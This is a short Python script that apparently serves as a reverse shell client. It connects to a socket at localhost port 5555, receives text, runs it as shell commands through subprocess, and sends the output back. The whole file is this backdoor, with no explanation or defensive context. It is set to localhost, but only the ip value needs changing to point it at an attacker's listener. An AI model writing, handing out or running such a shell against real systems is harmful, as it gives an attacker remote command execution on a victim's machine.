import socket 
import subprocess
import os
import sys

ip="localhost"
port=5555

s=socket.socket()

s.connect((ip,port))

while True:

   try:
       
        data=s.recv(8080).decode()

        result =  subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)

        result = result.stdout.read() + result.stderr.read()

        s.send(result)

   except KeyboardInterrupt:
      exit
